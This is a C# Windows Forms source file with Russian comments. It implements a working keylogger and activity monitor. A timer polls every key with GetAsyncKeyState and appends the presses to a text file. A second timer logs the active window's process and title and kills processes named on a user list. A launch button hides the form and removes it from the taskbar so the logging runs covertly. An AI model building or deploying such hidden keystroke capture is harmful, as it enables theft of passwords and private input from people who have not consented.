using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp4
{
    public partial class Form1 : Form
    {

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        public static extern UInt32 GetWindowThreadProcessId(IntPtr hwnd, ref Int32 pid);
        public string buf = "";
        public string path1 = "./test_file.txt";
        public string path2 = "./test_file2.txt";
        public string[] mas=null;

        public Form1()
        {
         
            InitializeComponent();

            //Если вдруг нужно посмотреть какие кнопки под каким номером то раскоментировать код ниже
            /* for (int key = 7; key < 256; key++)
            {
                richTextBox1.Text += key + "-" + ((KeysRu)key).ToString()+"\n";
            }*/
        }

        

        // Таймер срабатывает с частотой 0.1 секунды (выставлено в настройках формы)
        private void timer1_Tick(object sender, EventArgs e)
        {
            int key73 = 0;
            int key85 = 0;
            int key89 = 0;
            int key123 = 0;
           

            for (int key = 7; key < 256; key++) {
                int state = GetAsyncKeyState(key);
                
                if (state != 0) { 
                    richTextBox1.Text+= "{"+key+"-"+((KeysRu)key).ToString() + "}";
                    buf += ((KeysRu)key).ToString();

                    if (key == 73)
                        key73 = 1;
                    if (key == 85)
                        key85 = 1;
                    if (key == 89)
                        key89 = 1;
                    if (key == 123)
                        key123 = 1;
                }

            }

            if (key89 != 0 && key123 != 0)
            {
                Process.Start(@"C:\Users\User\AppData\Local\Yandex\YandexBrowser\Application\browser", "https://metanit.com/sharp/tutorial/18.1.php");
            }
            if (key85 != 0 && key123 != 0)
            {
                Process.Start(@"C:\Users\User\AppData\Local\Yandex\YandexBrowser\Application\browser", "https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes");
            }
            if (key73 != 0 && key123 != 0)
            {
                Process.Start(@"C:\Users\User\AppData\Local\Yandex\YandexBrowser\Application\browser", "https://telemost.yandex.ru/");
            }

            if (buf.Length > 20) {
                WriteTotxt(buf);
                buf = "";
            }
         
        }

        // Таймер срабатывает с частотой 1 секунда (выставлено в настройках формы)
        private void timer2_Tick(object sender, EventArgs e)
        {

            //https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getforegroundwindow
            IntPtr h = GetForegroundWindow();
            int pid = 0;

            //https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid
            GetWindowThreadProcessId(h, ref pid);

            //https://metanit.com/sharp/tutorial/18.1.php
            Process p = Process.GetProcessById(pid);

            richTextBox2.Text += "id: {" + p.Id + "}" + "  ProcessName: {" + p.ProcessName + "}+ " + "title: {" + p.MainWindowTitle + "}\n";

            WriteTotxt_2("id: {" + p.Id + "}" + "  title: {" + p.MainWindowTitle + "}\n");

            // Останавливаем неугодные процессы (получаем список из richTextBox3 в формате "name1;name2;name3")
            foreach (string item in mas)
            {
                if (item == p.ProcessName)
                {
                    p.Kill();
                }
            }
        }

        //функция для записи в файл path1 кнопок
        private void WriteTotxt(string value)
        {
            StreamWriter stream = new StreamWriter(path1, true);
            stream.Write(value);
            stream.Close();
        }

        //функция для записи в файл path2 Процессов
        private void WriteTotxt_2(string value)
        {
            StreamWriter stream = new StreamWriter(path2, true);
            stream.Write(value);
            stream.Close();
        }

        //Функция для запуска приложения (скрываем окно и убираем из панели задач)
        private void button1_Click(object sender, EventArgs e)
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.Width = 0;
            this.Height = 0;
            this.ShowInTaskbar = false;

            mas = richTextBox3.Text.Split(';');

            if (textBox1.Text != "")
                path1 = textBox1.Text;

            if (textBox2.Text != "")
                path2 = textBox2.Text;

            if (checkBox1.Checked)
                timer1.Start();

            if (checkBox2.Checked)
                timer2.Start();

        }

        //Функция для запуска приложения в тестовом режиме
        private void button2_Click(object sender, EventArgs e)
        {

            mas = richTextBox3.Text.Split(';');


            if (textBox1.Text!="")
                path1 = textBox1.Text;

            if (textBox2.Text != "")
                path2 = textBox2.Text;


            if (checkBox1.Checked)
                timer1.Start();

            if (checkBox2.Checked)
                timer2.Start();
        }

        
        private void button3_Click(object sender, EventArgs e)
        {
                timer1.Stop();
                timer2.Stop();
        }
    }
}
